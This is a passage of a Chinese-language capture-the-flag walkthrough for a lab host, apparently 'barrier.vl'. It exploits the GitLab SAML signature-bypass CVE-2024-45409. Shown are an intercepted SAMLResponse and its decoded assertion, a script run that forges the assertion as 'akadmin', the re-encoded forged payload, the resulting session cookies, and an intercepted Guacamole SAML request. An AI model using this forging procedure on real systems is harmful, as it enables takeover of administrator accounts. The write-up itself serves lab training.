dK0WMxk3QMzy%2FzzrZNDAicm8p7Zs%2BXa2VWJBvKckqvFN8%2FlbZ31XyS3XvwPxPqbskworL8fnPSHhs98myjw7gi6Yo0uEuCNx9TLmbwnOpYu0Gy2HJu7HPqUMW0kZTNcQgcjqfFpesyDfsDeE5q5c4kQOQZt9um9QTj5Yliryexa7d%2BCcSCU59qp25WReISRMIVOMJV9wriLZXJl1co9o9velo40KLEH0R7r8Jb8fz%2BqIJ6YZDD2vudss894gEm%2BMYb8pOkfQy3HhDhJV1WB0LSFnrZVTbrV%2BVZ8%2B1S81WbmvuBdFO5MrvEU2SyDl8qh95rtcE9NUR9OZpyYWgnH%2BMcy1xnCFwKcM9vgvpbvl%2FAUU4zGaTYBNC81AuzpKI73fyhmcHqUZsBZFA5QdCIkyYfTjdL8JxNZt3fpXcBdRMmIOWKiYTp8CvWly2oA0en9tWzPLzSllV6%2F1VtWLHypiuYOfhoJ1QoKb6%2FqqvZUSR0Wm9XUeVbOzNW%2BToHbgX0Kw0iOGfNrzUMscSTzd3NQLbsY2DkZUOXn40NkQLDrFz7jyTmlSdUcwGpXYZujozk7iCzj6jX5bGhDc2jVRJap4vjoGuOeHcyvP5nvXduCPweD9HYjhdjMZD8dbu1lNDH1ivXBvQXeraAZgY2svqPUaKFYMI5gX2zVPp9kqQbFFma0gr6ySIzA6WpSoUWjbPYry1HP9SBBAiT9jdluaJ5ze3oTldDfVUrC6rMPTU2PVyxzXkwJ8nJjQlFj9gF%2FMgIvt4pQCrZcZ6gpyuG09HGlFJfujRfKYiq2KucILaEmwhg2W2qcMFGzibIic1OGJSb7xrozPY1MnJxG%2FQcdx3jsIdjHCuVumWJ9KNLJnVJq5n9jRkmuWAMJz5jXSW%2Bai8jCduT%2BxTeu9sUox0lg1MamDXky2iWu3DVuFo2%2BvPHeCKMyUbXKAxaT%2B69EVWY52%2B4cSGLAngXnMTqSWz2eLuFfIFNqP0SRivl0BeJ%2FyKXUUAK%2FNxzXiSx4XNaat6kdZFK14c98hmIG2zZ6TDQUivh5XZQkYu8sagWtWJvbuCRTpqGJsHnKvXWrCde4FbOoML9KMmabeDtfSIjdicJcP8OrrZ3laEjMPWjYpsF0h8qdX22sG3eoQQ8%2BFebi3UbjWprR3EtpxjFhzQVjyepsZzyLt%2FmirV1VvIx8jSF8g6XLbYeJOV4dKZwUy24f0nG8hLY625rs8UF0lA2YMS2jMinYOpjptVj9FYgCzFC2e%2BdaDOhlnc8lnDUnLXTfzufjL4fTHiU1lI8AWkYxEdmwJarT3dHb3RnhXWkJK9fx9FvdaK7TxPMXO8ZbeB1Le2evC2pTu23NXsioTaF0klbMvNnECeea%2Bq2IxdWZCG7VTN28ZAkFFV5hWCS1dzzaFGfhPymAmsSOJgdCT5vRPgO59vKF4SICvTVXg1uc2q0e5o5O%2FWHZMJGJMfJueqJhY3uNZg1mzaouRVLWk%2FaUxBstUUX4votWmh%2BMzVJzkSemS7tFppDGzsOeflIF8rd73Y5hpppABjjIj3PMcNETB65fm%2BD6e72ZC7gYYyQd7e9cRd1rJUpbybBUPlsbVf4ZQijLx6DP2cs2c5ZIzCtqplj9%2FC4%2FU0OpHs1qqBQO3eSdheRp1K9DbnAodN8VzI8paLA8nC0JHj60Q5ldVZIvpxXx0VLeyGgzFktR23LpxAYiqGsEeS6FlNXBnzaNhwlztYdoMD%2BcqOxF6i9t6l1W%2BxNmzOwopV1vSq3VG7WwHvkJGGDpprxLx38ojwKrWZcRLRPpUtL75g3LKJ1evdoVHnEr8VQayfOux4ECpxqwoKSsv41I1QMnYoXdAD2urXQ3A%2BAPfCd5c0US%2FHxDHSIrGztZNfjkf%2F6pHLXYoUrPOdjZTTjMX4JI7QpuZgsioMGPNEHYd1gJBunay0I79i6vH2%2BfVq%2BeOJ%2Bo%2F066kLvzuR353ZX4mRM4ZnEA1fR%2FrC4xTxg7TcsYPh1wQP%2FYS%2BSPL4Y%2FKi%2BjzWfQuiBQeIn770wdB041eK9ery%2FWxCUyf5w%2B7B%2FF7v779nk1H1HIKgA93Trx09Qv6gN4NRGx2XDKD7FyOkX5m2vQBtc%2FCgjP8Pnv3GZH8G4YdPX7EuGnH%2B%2BNw%2F4PFgSRn4ERv6Fdsf4IffuPOCrX6waVAtsXx4Gf6CC795dxYqvuBQ6hhMn5%2BCOEkonGUSlgA4gmIxwxIExtABTUYkTTAARQIqYlGGCFCECGKCwWmcikiSIFkCCZJv%2Fn4GmvyIsf%2Bm4S8gl3wMYBp%2BIhLKoO8X%2FvTlt08%2B0XP00FvE5vJza7rY7JphyTeIXxhi23TD14X4qfOffHsn%2B5bTN4TD0OXhOIBffvjwKPJvvLOPMlAF%2FaeFbPZN0L4Q0Fv%2F4KAkvPzl8eMFYpjhJYq86uFFNy%2BDOO4e7yQ%2Fen69Wb821P%2F8U55vcN%2Br%2FSj9l%2BC7AOD37y%2FfnmfeHu2%2B%2FAc%3D HTTP/2
Host: gitlab.barrier.vl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```
</details>

<details>
<summary>CyberChef:只要"URL Decode(Treat "+" as space)","From Base64" 和 "Raw Inflate",什么都不用勾选，直接BAKE!</summary>
	
```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:ds="http://www.w3.org/2000/09/xmldsig#" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:xenc="http://www.w3.org/2001/04/xmlenc#" Version="2.0" IssueInstant="2026-03-30T12:22:04Z" Destination="https://gitlab.barrier.vl/users/auth/saml/callback" ID="_19ae2ad4347c4bfbb78c0654b834a369"><saml:Issuer>authentik</saml:Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status><saml:Assertion Version="2.0" ID="_6992bd85cd2e43219516116e3e099645" IssueInstant="2026-03-30T12:22:04Z"><saml:Issuer>authentik</saml:Issuer><ds:Signature>
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="#_6992bd85cd2e43219516116e3e099645">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>fI9+uyF4ke1ieN0punbjj6g0dB9P4kdxlZ76P6ZmovA=</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>hNcR4OJV3JcPghRptiIF4ivoYMcCAaFYPe0XW51KC0RmNTTdjsWYuMK7HoKTgog+
eq+I7uJ7VcqbCJskGQErHjp26qe7ccuubOryD6ly3dYOy2hAqOQS0I38wSd34Vpb
2Lw/+Wzex0SQ9roPTL4XMAZPARmGf+gohZ7P8zIknYWF4y/GSo2qErZO8iY09MIm
D+N/lyUHYK06erjeQO38pzZXkltui2qBKvVv5SHWWQUqqyMG1s5OPKIZxP399D1n
+aPiLPFipJD3Ow+OEZ6fFnOgrjSDZgX9vlDeHHDodw2Ja342L6BxCHx6nU9iqGaJ
ZBTDpNnjSA2Eu/vlRifLi9lgEbybYVKkBQaTEoWP1jkx4qGxUzIqqKYguZBnHMYk
d1TW989BKrKChB5LSmW+PcmK9WAXRz4oS7yLcyM86GP2s6Z8Yd673Dp3MWlIH2CN
PD9vDUeVt0eoVkFNbhj7IVQnXsNJ0dI6EbCKiH6NDy2F1sYmrJZXCF875+yoqk59
CHhSUeVstq5bmPpqHFpPpJ0VvLDtCmbLv59UI3IKbtFx5hd+CqlJhXA4B9CfXyuI
/tgcTRPyEz/HY3iJWk1s7hsQKhrcZpBJx+iInoOVvHUSDi63flI6wryYuIsavUMn
zmIDcuGas8BBThrHPO24cXwg7ZPZ7mEIdCHwg59IBSk=</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>MIIFUzCCAzugAwIBAgIQKtQS95zOTi6Uhb7Oomo4tDANBgkqhkiG9w0BAQsFADAe
MRwwGgYDVQQDDBNhdXRoZW50aWsgMjAyNC4xMC41MB4XDTI0MTIxNDE1MzgwN1oX
DTI1MTIxNTE1MzgwN1owVjEqMCgGA1UEAwwhYXV0aGVudGlrIFNlbGYtc2lnbmVk
IENlcnRpZmljYXRlMRIwEAYDVQQKDAlhdXRoZW50aWsxFDASBgNVBAsMC1NlbGYt
c2lnbmVkMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAw4S8GGf2x07B
iDyFD3TKHGB9tFn0RI0FemZaCfCx2RUWzqCV+yPzB+fzC1Pf8UMgIP8dgeZmp3HQ
G3djppDhij+I+mETvLQdSQh8rk9ytUMW1eLgNTvNEH0IH1xEJEcmHOTPwcSNrezk
yIo0OZWGBFp8Vl3gGzLceJupdau9FUYiVOG4peUdSjrYP6xLN8IPo16Kh1+j8xD+
jZ8Nqjkx/GR70mfgPjqSO1EACjpHyjzhsruK43dTycDbxqOoY13pRrExo7U9YlEO
zFrpteP21sHLzd0k+80CPq/ZPWlXsIafJ18JOF+QWCD8K/HFmbCp9ihd3pQSZqka
0Hx2zRFyxBBGwtoWvOLWk+q+bbYLdXYiSXOHaZyx8bPF93U2qPUD0Td+IeQp8unx
SrruWV70L5Bts1iy6cQm8v/f1RF/Q0tQPpgSAaG/hxcSgOA4xLwBXR1yeGnfWP3w
VuTrSIAUObym+gJB4gGHFPmGdny9WthMQSebbyBGFjHBclquWAT4Tg7TSGg25SYk
Fo/XYHQ4m+TbpIA7RYsjreAkj6HOAaM8gsuX7qHLdN7w34G5l4eXviP0nFPoJ3Xv
ZC9h6NxCuvqaHEfB+9+ce2liuE8YFYAboWJLYcMrc+BDuT0Gt5RPs8FUUCgvU+Pp
OiDBOtLQmW9zXCQ5SLbdPU3AnEMaJysCAwEAAaNVMFMwUQYDVR0RAQH/BEcwRYJD
OUJXckhKaFBlMnRES3JNc04yUzlJQ1RpMFpnS0RQSVhaU1pDVWxoYS5zZWxmLXNp
Z25lZC5nb2F1dGhlbnRpay5pbzANBgkqhkiG9w0BAQsFAAOCAgEArshIX0felsel
T8D7iexndo+s272a0iVO/hZQU6jOPkwiyM2g5KrxBKzWOBTku3xlkF/qegukcVok
+EYNXuYuRyI9OFfTZzuDNnMkJyyxd8Vwhwt5NJRLUYJlXupAvPrkf6TkfmCJlGyf
YPzmmdPdXHCFtJxmyJoO00uLIy+03FvPEA1OiwCid8aQcFA/1u5BTSa3KZBo6BFC
QhNL/+xXo+oMz1cZKEr8hC28iUxSvLfQAtXQtPn9gp15vLl7ZfoPCFRLg3ED1vop
djAnWHcCs0JOoYlOt9dYSjtuiEIzNkJiM5Oge28OcBYYSXb0euYljzTbxzPo5Kt7
hCHJzNfXXcklLFiryCOLB2EZm36ICuBLVbZiARyHb8OkRQm7OoJ/uvWuScHXnLO0
pTSf9sH1SmDYGjk3/PDjkHHJAdaFQ21uABnfIWlmjF4suTmVIMbrtUOthnRdpX/f
DgDb/Y551jLfXH2Y7/OXgnehw/aHv9u4TF6TYqpNwdMtGjC+9IE7+pK6Kwk/K0u7
UMXOdBYWY4bvFphOWD1sgHQYdq2ArYPnEKUoLyl3wkadNWr2VUCmDJLCI17H3xru
fur17k7t1pNvUajUeXqBrqgfLqVfSOgkfRhESiqVVZvY5ErZ5CQjz9cIWy2d3xDu
GnA/5mkO/2YDN3/Ne05Xnf+MVB+8nuw=
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature><saml:Subject><saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">satoru</saml:NameID><saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><saml:SubjectConfirmationData NotOnOrAfter="2026-03-30T12:27:04Z" Recipient="https://gitlab.barrier.vl/users/auth/saml/callback"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore="2026-03-30T12:17:04Z" NotOnOrAfter="2026-03-30T12:27:04Z"/><saml:AuthnStatement AuthnInstant="2026-03-30T12:17:04Z" SessionIndex="adff6398f94e3012d8944287a75c5748e10a6c9184a104ad483736c5545940af" SessionNotOnOrAfter="2026-05-29T12:22:04Z"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><saml:AttributeStatement><saml:Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress"><saml:AttributeValue>satoru@barrier.vl</saml:AttributeValue></saml:Attribute></saml:AttributeStatement></saml:Assertion></samlp:Response>
```
</details>

#### 将其保存saml.xml
```
[★]$ vi saml.xml
[★]$ python3 CVE-2024-45409.py -r saml.xml -n akadmin
[+] Parse response
	Digest algorithm: sha256
	Canonicalization Method: http://www.w3.org/2001/10/xml-exc-c14n#
[+] Remove signature from response
[+] Patch assertion ID
[+] Patch assertion NameID
[+] Patch assertion conditions
[+] Move signature in assertion
[+] Patch response ID
[+] Insert malicious reference
[+] Clone signature reference
[+] Create status detail element
[+] Patch digest value
[+] Write patched file in response_patched.xml
```
#### CyberChef:"Raw Deflate","To Base64","URL Encode(Encode all special chars)"
<details>
<summary>Output</summary>
	
```
7XhXj%2BLMtvY9Ev%2Bh1e8l6nFO6J3RccDYgBMGbHPzyaEcwAkHsPn1u%2Bgwu2fOvHNm7%2BtPQoJaVfXwrFRVa%2F3d%2BkVez7egrauyBU9DkZft%2FFX49blvynnlt1k7L%2F0CtPMunNu8tpnjX9B53VRdFVb586ctv9%2Fhty1ouqwqP7ZE7dfntOvqOYLcbrcvN%2BJL1SQIjqIognIIXBO1WfLXx%2Boi%2Bj18ATo%2F8jv%2FY%2F0AyvAf8DEEJR%2F4cAWEP4Cmhay%2BPkOU5ye1bXuglm3nlx0UoTj9ghIvBLrD8DmOz1Hy%2BPwkgbbLSv%2Bhy9s%2FtPAvkqzL%2FeBL4DdNBpov1xzpob4t4vddijysg4R%2Bngd%2BeIZ%2FIn19VqUXDgc0xzLxCxmT4QtJAPKFRWnyxQcRVAVDOSqOnr%2B9umj%2Byqv59kADZZed%2F37F%2FBC%2Fu9Hu%2FK5vfxyJVQSeDn7eg9%2FbD2oMV8%2FtPgxB2z4jP6JI0LpZ%2Fu3vqIWxEoMGmg487bfq1%2Be%2F%2Fh%2FNcXgQsVQY4YAkcIyjMBrDaEAAlONoknr%2BNnns2zV%2B2cZVU7Tfpj8Knvg8qZqsS4s%2FCQhQXkFe1SB6gSPohb4BkO1%2FCokhGPqAfAFD%2BBJiZPnXGwjyK6ZSlkCXa6BLq%2BgPkP8dXW3q4xT9nd4bzqszvgWSQCoxXRkBlcnq3bGrcmaYIMtPnoN24Rb6pT44yKlKtK%2BvrD5vfif63RWvgl%2F56wfheyjxH4n4c%2BjDqPy%2FnfknGfJnMQsVsD88%2BG6gxxhEahlX7wLRL6syg5mT3V%2Fz7Y998Gvvfv7L%2F9Cdj9h7KaoG%2FNW0%2FstPjv0vcuKngP3%2FSfGI61jlZv0ok2eAZUBH674MTic6QSOBM8lzNORHhjbpY1Fd%2BT9Mil8F1fcQeNuX6uGWNFYHYhWaSbqtu0yVyexaeVoo8r7smQB1HQpbi%2Bi20He76NQ6Xq%2BtGaVa75IqmU0n4DJTmX7FHMJLIK7a89JaNMqpxukLYMKw7wOjGSU6H4nIM0Y85S%2BGZaMqwd7siCAPdTCd4JsbMnPuYEBti2sqc7chXY0%2Fmvy2WMazpEqPjMne1XPpOTI5Iku7wi%2BL5miwmYdymlpMJ9JMR%2FJxr3hrlAbNCVgGwdb3o3vOuz7DL8L6erhStuI41v5yGbUl1lKGuVaPg0lwnISV08nMN7ONKWf1SiKM28xYHOlYLo2kOdnSMXG5ay4BRZGq6IavfILEN7QwiMpAl3suuyz91XRyFHZSrZcnm8cXPXLNt1m8ybg8WQRj4B3WZ8Hyd4vKMbHTeSAvy2F%2FVy%2BXtZf0R6FUNO88nUTYzuFYTlg3azEVqI1dODMzLNacw7vbO1nZzLgJR42llybe0kfWi2iGkGpCc3JVwUV9OjEl7irtwaFDQXU4y3qQnhj1YJVuq6%2FQSKUXgbjOFFqXRlzGWq9oVkdXlFmGmo3V5Uxx04mopDYEaLsLFRRmfVHk2qxX6OG6kTqxCDZXiturhLoOOnmg0mgmXvJV6vKkwImxO%2FbqdIJ0SbjbmuPijigeka2cM9YyaWut0yY81sJqmGVqWRmHq7K3pYwm4lylb83o9WrrX%2Fca9MW9UKWwX%2FotKwi7tFFMAydD95YwR%2FPIFAs1EpVbQnGqYJ%2FfEuGnmH4L9DUYP4W9S6GcBF9In4bi4yKI4fnagW%2Baqsr7uyjy9z7hb6rAJ6q17iybo%2B7GLqP3acAYVVGRncTrQnK%2BpOdsyd1QgbdamZd4MJ1o29ttmXjSwbIkSdDTyN1WR4dCfadNtBM%2F6iI5aCKJaQLpSjsV1XbqoEsLTLsnNx2rXBjEOxV7le6%2BS2%2BH0%2BKiicmSx%2FYL%2FnZLPfeA%2BstDHy3zRpX1PFh6XYjnZVAcYACpCz0Py219LOBF6m5zbaveFvwrp7XE5585DbLE20KiHwS%2B1UTsDWk6%2BcCC9hDV08%2B6LmSeN0Q%2BYfnHvJis4W9Ii7TZ5TLGB5QRppNMGmWJ2K2VpcB1coluVVQGxdEXY3HAt3vnfhEPs9G8C7P4LmJmzO61RDXZKAHHoiYUazpZEtGprqU0O83UWbHYXTdWZFsp25y5sdtrDgY2ib676gsFVRVsWKwWYaEYO%2FMW2noD7tAOo1qhxtFZCnLNHnIiWd43IVj1deT3nLz3soOxJGuwj%2BxT45n0sNFZ1awwep1isxM7SPBQOx1Z%2FQITFVluGbSIE%2FN0sQ1swYunWhlP97Rt%2BjVJRLsxlILhYlQeRtTbZjFUzJ7z8oUBg1hu6g6YONYqm3uEnmcsKpoX5Gg6uduqfrzC2JUhzyxHlNg1oshFINZclkZEbdnHy9mfTlBlwO9beRwEYXnrKudqbJzz7DILAm8TuV5mu4biH8eBDUyZI%2Fb4xdxL6C6aqcCq2b4cphO7aXrnwKAbSuhaLBvp0CrYKxJjWxmx0M4y68Tm%2FSWSDqGdGDw5bG6Cu8VGsCxjxyRu08mh3zW2yu%2BNYCxmyUogk6Uim8UyKkfO6VLNskEQjMJSPilCmF96h9%2BRu4TZ2csEp%2BzHoSZXiOspFlnMdkGt8szWa08N4M8nWjF4X2OTtneZi7KJdOZGkEsqJ4F7zUy0lM1qRbhXeLCKXErrg9hfL76yiIUZNwsBnmf9gvVkjw8qZ7XxQq0JZ4LU79BlR23NlpX3ezG57mdmPZ0YmSQY3cYqHO7uihZlb4LI3BN8udD81diKPMwS3tcPmqzd9hbMly265S0FERbhbeutJIiwX7nhOV37spBr5XZhEys9RMlxf89XFratNbkubXRr2YfU32O1dHCGyrOp%2B9EZio2rQw5HnMqPIlUG8OSNlmkewDz1R6oO7r84UV6zbME3baq6aAzyFuTTyY6VmAwMZVTNWpzBfRTGMZIerT19MszzLRs1PKHWzSCs744h7M49MeRnGbmApD%2BHhwr6YrbwdLf3%2Bu2ocoYc7473XtJL7bwaxyFiD7f01lH6arvZe6vc7Wv%2BajbnmN6d40Jc5csxnk48814UkRm5iih3q6EYV5WBov1GHWcoIV%2FNBY8Z2U3MIta3QplHsJ4SdrZPrI9CRQuyOJ1Yqb5BZoNbzSrtjoXH9aJhUxFns%2F1gXzexxXeu1Zkll9QYdd3kzDGuTFHebhJiIWHXCloyOvGlo4Rii65g4uVGx0WefYIX%2FUK96%2BdVplFGAnDWCAXPs90ABb2Xn%2B67YLibFbXumOkkFZXVXY9d6NJ8I2fNKBobAV8cC4JWxV7YHIJjxm9HJWCN89Yq4NG%2FQvqr09uh4pYbA51O6p0dc62C2YXkLU9nAjGl01lRVnzkyxaO9bxQxqqTFyeZbPtdcVC1oOn2RpeW26h2EWhJKZECxKMo7LSJXQX3GMRw4VMtvSG%2BcuV6cifTO%2B9S67dI65YnccapC2ZWr%2Bn17Yys0R5qsddcIxI8xyODq1ynhiNhbaJYXnTBeXiulYv1vtqMOXE7%2B5HuNPhhLxbSaiOqGKMQQ9NPJ3HfYMyZ6bBav%2B790x64F6G5JPHmcohtIznH23RhZ5fD4Xj1KPjiokTrdOdC1RnxiBgkiLAseYQqzgaCe5JOIDpAKbeMZ9pBmLFlf%2Fv6%2Fgr9%2Bbr9JP64lB%2FjT1f2D9f6e0ll98EJhN37SIdVvCo9yfBV7sNa7J%2FKe%2BwL9irJopfHA97v5n3Z1iCEVABsMPjQOEVWvldnb5g%2F%2Fp1YlXH22PgoGt9e%2FL9vJoTFPAB%2BA5qPUvAXQA%2Btn%2FSqM0qj4eMONJ%2BKSexRTJLcHGdgu2ULmdYZrCD%2Fq2YLbGS8KfYLCj9NvXOFK6LsMd0%2B6AkA2gz2Tn4sdDHmrRX0B%2FzfOylzHnIrH4U4KKAuT6%2FDfyijP9Bt2ImBPNQyAsPXZz%2BKY5rg2JgjAYFieMRyJImzjM9QIcWQLMBQnw45jCVh74j0I5IlGIIOKYqkOBL14%2B94f0D6M2dojw4MH9b5LBJz2NSD9da33%2Fb9wnn4WAfFJvy6VU1kwuYhtDeIXovKumq6d0f8EvwXcz%2FIvtv0g2HXNVnQd%2BAfJ54eQf69Um3DFBR%2B%2BwWWp23l168l6619VK0UAj9Z9GhedCMCtciKFoFrs9yPoubRJvsZ%2Be313fpd1fT%2F8%2B%2Fw%2FKD747Kfpf9L8EmB95mP1s33zs5H5%2FbbvwA%3D
```
</details>

#### 现在我们可以复制 response.xml 中的值，并将其粘贴到 BurpSuite 中 Responder 里等待处理的请求中，替换原有的 SAML。
#### 在Burpsuite粘贴，恢复浏览器的网络，Burpsuite点击'Forward'
<details>
<summary>查看 BurpSuite 中的 HTTP History</summary>
	
```
HTTP/2 302 Found
Server: nginx
Date: Mon, 30 Mar 2026 12:54:36 GMT
Content-Type: text/html; charset=utf-8
Location: https://gitlab.barrier.vl/
Cache-Control: no-cache
Content-Security-Policy: 
Permissions-Policy: interest-cohort=()
Set-Cookie: known_sign_in=TFQwZ3NxbWxRS1ljUzkySXFyNUtEQThKMXlvNUtxMWFmbk9uSHdxUXlzcmFJbTk1WnZ0OTI2WWw3M1EwMlBJNDRybG10VWRKZHhpc25yaHdrN0h0VXBLbnI5d3VxUzlkYS9QZUlCQ0I2cEt6R3FTNHFMdzR0d3NWTjd1VVR2ZkMtLVNnSUZyYjZWVVgyWmV5ckJTTU4vVXc9PQ%3D%3D--4b896f4299cad578f7e7df1ec908df5c9654cb44; path=/; expires=Mon, 13 Apr 2026 12:54:36 GMT; secure; HttpOnly; SameSite=None
Set-Cookie: _gitlab_session=d7ffb73d24dd8373260293048077e739; path=/; secure; HttpOnly; SameSite=None
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Gitlab-Meta: {"correlation_id":"01KMZCYWMVC88BGPSJBV3S0C6B","version":"1"}
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01KMZCYWMVC88BGPSJBV3S0C6B
X-Runtime: 0.473371
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Strict-Transport-Security: max-age=63072000
Referrer-Policy: strict-origin-when-cross-origin

<html><body>You are being <a href="https://gitlab.barrier.vl/">redirected</a>.</body></html>
```
</details>

#### 发送之后，我们应该能看到两个“Set-Cookie”，可以直接复制到浏览器中，然后刷新网页，我们就会以 akadmin 的身份登录了。
```
%3D%3D 要变成 ==（URL解码）
```


____________________________________________________
### 其他
#### Burpsuite拦截 SAML XML ，拦截不到GET请求 SAMLResponse
#### 拦截的操作是：
<details>
<summary>在使用密码登录后，点击'Guacamole',再点击Continue之后，退出来，点击'Guacamole'拦截它的Continue</summary>

```
POST /guacamole/api/ext/saml/callback HTTP/1.1
Host: barrier.vl:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 6803
Origin: null
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIiB4bWxuczptZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOm1ldGFkYXRhIiB4bWxuczp4ZW5jPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyMiIFZlcnNpb249IjIuMCIgSXNzdWVJbnN0YW50PSIyMDI2LTAzLTMwVDA3OjM2OjQzWiIgRGVzdGluYXRpb249Imh0dHA6Ly9iYXJyaWVyLnZsOjgwODAvZ3VhY2Ftb2xlL2FwaS9leHQvc2FtbC9jYWxsYmFjayIgSUQ9Il81OTlkYzdiMWM1YWU0NTE4YTZmNWE1ZjBmODY0ZGFlYiI%2BPHNhbWw6SXNzdWVyPmF1dGhlbnRpazwvc2FtbDpJc3N1ZXI%2BPHNhbWxwOlN0YXR1cz48c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8%2BPC9zYW1scDpTdGF0dXM%2BPHNhbWw6QXNzZXJ0aW9uIFZlcnNpb249IjIuMCIgSUQ9Il9kYWE4NjQ1MmViZTU0MWI3OWU5YjljZGY0ZTcyYWMwZSIgSXNzdWVJbnN0YW50PSIyMDI2LTAzLTMwVDA3OjM2OjQzWiI%2BPHNhbWw6SXNzdWVyPmF1dGhlbnRpazwvc2FtbDpJc3N1ZXI%2BPGRzOlNpZ25hdHVyZT4KPGRzOlNpZ25lZEluZm8%2BCjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2Ii8%2BCjxkczpSZWZlcmVuY2UgVVJJPSIjX2RhYTg2NDUyZWJlNTQxYjc5ZTliOWNkZjRlNzJhYzBlIj4KPGRzOlRyYW5zZm9ybXM%2BCjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPgo8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCjwvZHM6VHJhbnNmb3Jtcz4KPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jI3NoYTI1NiIvPgo8ZHM6RGlnZXN0VmFsdWU%2Ba2s2WU5pSVQvdjAwT01mQ2pVVWtoVWpSV1QxcW5YQTU3MU1JV25MMmxUbz08L2RzOkRpZ2VzdFZhbHVlPgo8L2RzOlJlZmVyZW5jZT4KPC9kczpTaWduZWRJbmZvPgo8ZHM6U2lnbmF0dXJlVmFsdWU%2BcUFuMWlsZjRJZVlwWVMrZEZMR2RJR0U3MGcyZWNxazM0SnBFd1AwZjRoVW5UWW9pWDRWWXlnTEYxSDZveElQUwoyeUZkWkgxT0laVmNud08rTm1EbFVPd2t3MGc0bUhia3M5OWh6Z3VnYzV2Ym5Da2lrL2J0QXg3SWpUM0swSnUrCnZEdjc2QW9rOUxpSDNkU0wxRVpBRHcxNHdMU2ozN050OVUyVDRoRlhhMXpGWFNHelo3RDZhV2xDV3ZwUnE4dDQKRlV5ZWtzckdQSnQ5dm9IM2ZvQ3FxVWNRaDVKYzQwMGJ4THJhU1NucEw3Q3JMUDhtVjNPS0ZhTmVIbWxtYTdxQwpobzhxaTJlL1FSRDFudXArRDZsdmUvMVJnWDhXR2hNTkVQK0pzcmw0bkFaUWx1bTRYQWJBSG9wS0FwbXJLNmY5CnNCMHRUMUFuUWUxU1NDNlVtZE5jcmlaamVrVk0xQVJsRVNXdVlqS1RtVEJqbXoreDVGdWdLcWZyZnlpYjVKNnkKRVNEZzlKaTh0Z2pheWs5SUY3OXIxNEFXZmZRelQxRGZNNXRpSXdFaFlYOVJKY01VMTdzTWc5SWNLNU83UFovVApJMisyZjUvNWZ5eVN3Zk5XTmQ5NEtNSHdRQ1JsSE